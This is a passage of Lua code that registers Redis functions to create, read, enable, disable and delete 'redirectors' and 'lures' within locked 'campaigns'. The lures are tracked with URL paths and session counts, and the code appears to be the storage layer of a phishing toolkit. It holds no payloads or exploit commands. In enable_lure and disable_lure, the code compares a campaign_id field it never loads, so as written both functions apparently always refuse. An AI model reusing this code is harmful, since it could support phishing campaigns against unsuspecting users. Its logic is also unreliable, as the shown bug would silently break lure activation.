    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= redirector.campaign_id then
    return redis.status_reply('FORBIDDEN redirector campaign_id mismatch')
  end

  if redis.call('EXISTS', redirector_fields_key) == 0 then
    return redis.status_reply('OK redirector fields is empty')
  end

  -- Point of no return

  redis.call('DEL', redirector_fields_key)

  return redis.status_reply('OK redirector fields removed')
end

redis.register_function({
  function_name = 'clear_redirector_fields',
  callback = clear_redirector_fields,
  description = 'Clear redirector fields',
})

local function delete_redirector(keys, raw_args)
  if #keys ~= 5 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local redirector_key = keys[3]
  local redirector_fields_key = keys[4]
  local redirector_index_key = keys[5]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', redirector_key) == 0 then
    return redis.status_reply('NOT_FOUND redirector not exists')
  end

  -- stylua: ignore
  local raw_redirector = redis.call(
    'HMGET', redirector_key,
    'campaign_id',
    'redirector_id',
    'lure_count'
  )

  local redirector, redirector_err = normalize(raw_redirector, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'redirector_id', kind = 'str' },
    { name = 'lure_count', kind = 'int', min = 0 },
  })

  if redirector_err then
    return redis.error_reply('ERR normalize redirector: ' .. redirector_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= redirector.campaign_id then
    return redis.status_reply('FORBIDDEN redirector campaign_id mismatch')
  end

  if redirector.lure_count > 0 then
    return redis.status_reply('FORBIDDEN lures exists')
  end

  -- Point of no return

  redis.call('DEL', redirector_key, redirector_fields_key)
  redis.call('ZREM', redirector_index_key, redirector.redirector_id)

  return redis.status_reply('OK redirector deleted')
end

redis.register_function({
  function_name = 'delete_redirector',
  callback = delete_redirector,
  description = 'Delete redirector',
})

--
-- Lure methods
--

local function create_lure(keys, raw_args)
  if #keys ~= 6 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local lure_key = keys[3]
  local lure_paths_key = keys[4]
  local lure_index_key = keys[5]
  local redirector_key = keys[6]

  local args, args_err = normalize(raw_args, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'lure_id', kind = 'str' },
    { name = 'path', kind = 'str' },
    { name = 'redirector_id', kind = 'str' },
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  local now = current_time()

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', lure_key) == 1 then
    return redis.status_reply('CONFLICT lure already exists')
  end

  if redis.call('EXISTS', redirector_key) == 0 then
    return redis.status_reply('NOT_FOUND redirector not exists')
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= args.campaign_id then
    return redis.status_reply('FORBIDDEN lure campaign_id mismatch')
  end

  if redis.call('HEXISTS', lure_paths_key, args.path) == 1 then
    return redis.status_reply('CONFLICT lure path already taken')
  end

  -- stylua: ignore
  local raw_redirector = redis.call(
    'HMGET', redirector_key,
    'campaign_id',
    'redirector_id'
  )

  local redirector, redirector_err = normalize(raw_redirector, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'redirector_id', kind = 'str' },
  })

  if redirector_err then
    return redis.error_reply('ERR normalize redirector: ' .. redirector_err)
  end

  if
    redirector.campaign_id ~= args.campaign_id or redirector.redirector_id ~= args.redirector_id
  then
    return redis.status_reply('FORBIDDEN lure redirector_id mismatch')
  end

  -- Point of no return

  -- stylua: ignore
  redis.call(
    'HSET', lure_key,
    'campaign_id', args.campaign_id,
    'lure_id', args.lure_id,
    'path', args.path,
    'redirector_id', args.redirector_id,
    'is_enabled', 0,
    'session_count', 0,
    'created_at', now
  )

  redis.call('HSET', lure_paths_key, args.path, args.lure_id)
  redis.call('ZADD', lure_index_key, now, args.lure_id)
  redis.call('HINCRBY', redirector_key, 'lure_count', 1)

  return redis.status_reply('OK lure created')
end

redis.register_function({
  function_name = 'create_lure',
  callback = create_lure,
  description = 'Create lure',
})

local function read_lure(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local lure_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  if redis.call('EXISTS', lure_key) == 0 then
    return nil
  end

  -- stylua: ignore
  local raw_lure = redis.call(
    'HMGET', lure_key,
    'campaign_id',
    'lure_id',
    'path',
    'redirector_id',
    'is_enabled',
    'session_count',
    'created_at'
  )

  local lure, lure_err = normalize(raw_lure, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'lure_id', kind = 'str' },
    { name = 'path', kind = 'str' },
    { name = 'redirector_id', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
    { name = 'session_count', kind = 'int', min = 0 },
    { name = 'created_at', kind = 'int', min = 0 },
  })

  if lure_err then
    return redis.error_reply('ERR normalize lure: ' .. lure_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= lure.campaign_id then
    return redis.error_reply('ERR lure campaign_id mismatch')
  end

  lure.is_enabled = lure.is_enabled == 1

  return { map = lure }
end

redis.register_function({
  function_name = 'read_lure',
  callback = read_lure,
  flags = { 'no-writes' },
  description = 'Read lure',
})

local function find_lure_id(keys, raw_args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local lure_paths_key = keys[2]

  local args, args_err = normalize(raw_args, {
    { name = 'path', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  if redis.call('HEXISTS', lure_paths_key, args.path) == 0 then
    return nil
  end

  local lure_id = redis.call('HGET', lure_paths_key, args.path)

  if not lure_id or lure_id == '' then
    return redis.error_reply('ERR malform lure_id')
  end

  return lure_id
end

redis.register_function({
  function_name = 'find_lure_id',
  callback = find_lure_id,
  flags = { 'no-writes' },
  description = 'Find lure id',
})

local function read_lure_index(keys, args)
  if #keys ~= 2 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local lure_index_key = keys[2]

  if #args ~= 0 then
    return redis.error_reply('ERR wrong number of args')
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return nil
  end

  return redis.call('ZRANGE', lure_index_key, 0, -1)
end

redis.register_function({
  function_name = 'read_lure_index',
  callback = read_lure_index,
  flags = { 'no-writes' },
  description = 'Read lure index',
})

local function enable_lure(keys, raw_args)
  if #keys ~= 3 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local lure_key = keys[3]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', lure_key) == 0 then
    return redis.status_reply('NOT_FOUND lure not exists')
  end

  -- stylua: ignore
  local raw_lure = redis.call(
    'HMGET', lure_key,
    'lure_id',
    'is_enabled'
  )

  local lure, lure_err = normalize(raw_lure, {
    { name = 'lure_id', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
  })

  if lure_err then
    return redis.error_reply('ERR normalize lure: ' .. lure_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= lure.campaign_id then
    return redis.status_reply('FORBIDDEN lure campaign_id mismatch')
  end

  if lure.is_enabled == 1 then
    return redis.status_reply('OK lure already enabled')
  end

  -- Point of no return

  redis.call('HSET', lure_key, 'is_enabled', 1)

  return redis.status_reply('OK lure enabled')
end

redis.register_function({
  function_name = 'enable_lure',
  callback = enable_lure,
  description = 'Enable lure',
})

local function disable_lure(keys, raw_args)
  if #keys ~= 3 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local lure_key = keys[3]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', lure_key) == 0 then
    return redis.status_reply('NOT_FOUND lure not exists')
  end

  -- stylua: ignore
  local raw_lure = redis.call(
    'HMGET', lure_key,
    'lure_id',
    'is_enabled'
  )

  local lure, lure_err = normalize(raw_lure, {
    { name = 'lure_id', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
  })

  if lure_err then
    return redis.error_reply('ERR normalize lure: ' .. lure_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= lure.campaign_id then
    return redis.status_reply('FORBIDDEN lure campaign_id mismatch')
  end

  if lure.is_enabled == 0 then
    return redis.status_reply('OK lure already disabled')
  end

  -- Point of no return

  redis.call('HSET', lure_key, 'is_enabled', 0)

  return redis.status_reply('OK lure disabled')
end

redis.register_function({
  function_name = 'disable_lure',
  callback = disable_lure,
  description = 'Disable lure',
})

local function delete_lure(keys, raw_args)
  if #keys ~= 6 then
    return redis.error_reply('ERR wrong number of keys')
  end

  local campaign_key = keys[1]
  local campaign_lock_key = keys[2]
  local lure_key = keys[3]
  local lure_paths_key = keys[4]
  local lure_index_key = keys[5]
  local redirector_key = keys[6]

  local args, args_err = normalize(raw_args, {
    { name = 'lock_secret', kind = 'str' },
  })

  if args_err then
    return redis.error_reply('ERR normalize args: ' .. args_err)
  end

  if redis.call('EXISTS', campaign_key) == 0 then
    return redis.status_reply('NOT_FOUND campaign not exists')
  end

  if redis.call('EXISTS', campaign_lock_key) == 0 then
    return redis.status_reply('FORBIDDEN campaign not locked')
  end

  local lock_secret = redis.call('GET', campaign_lock_key)

  if not lock_secret or lock_secret ~= args.lock_secret then
    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
  end

  if redis.call('EXISTS', lure_key) == 0 then
    return redis.status_reply('NOT_FOUND lure not exists')
  end

  if redis.call('EXISTS', redirector_key) == 0 then
    return redis.status_reply('NOT_FOUND redirector not exists')
  end

  -- stylua: ignore
  local raw_lure = redis.call(
    'HMGET', lure_key,
    'campaign_id',
    'lure_id',
    'path',
    'redirector_id',
    'is_enabled'
  )

  local lure, lure_err = normalize(raw_lure, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'lure_id', kind = 'str' },
    { name = 'path', kind = 'str' },
    { name = 'redirector_id', kind = 'str' },
    { name = 'is_enabled', kind = 'int', min = 0, max = 1 },
  })

  if lure_err then
    return redis.error_reply('ERR normalize lure: ' .. lure_err)
  end

  -- stylua: ignore
  local raw_campaign = redis.call(
    'HMGET', campaign_key,
    'campaign_id'
  )

  local campaign, campaign_err = normalize(raw_campaign, {
    { name = 'campaign_id', kind = 'str' },
  })

  if campaign_err then
    return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
  end

  if campaign.campaign_id ~= lure.campaign_id then
    return redis.status_reply('FORBIDDEN lure campaign_id mismatch')
  end

  -- stylua: ignore
  local raw_redirector = redis.call(
    'HMGET', redirector_key,
    'campaign_id',
    'redirector_id'
  )

  local redirector, redirector_err = normalize(raw_redirector, {
    { name = 'campaign_id', kind = 'str' },
    { name = 'redirector_id', kind = 'str' },
  })

  if redirector_err then
    return redis.error_reply('ERR normalize redirector: ' .. redirector_err)
  end

  if
    lure.campaign_id ~= redirector.campaign_id or lure.redirector_id ~= redirector.redirector_id
  then
    return redis.status_reply('FORBIDDEN lure redirector_id mismatch')
  end

  if lure.is_enabled == 1 then
    return redis.status_reply('FORBIDDEN lure not disabled')
  end

  -- Point of no return

  redis.call('DEL', lure_key)
  redis.call('HDEL', lure_paths_key, lure.path)
  redis.call('ZREM', lure_index_key, lure.lure_id)
  redis.call('HINCRBY', redirector_key, 'lure_count', -1)

  return redis.status_reply('OK lure deleted')
end

redis.register_function({
  function_name = 'delete_lure',
  callback = delete_lure,
  description = 'Delete lure',
})
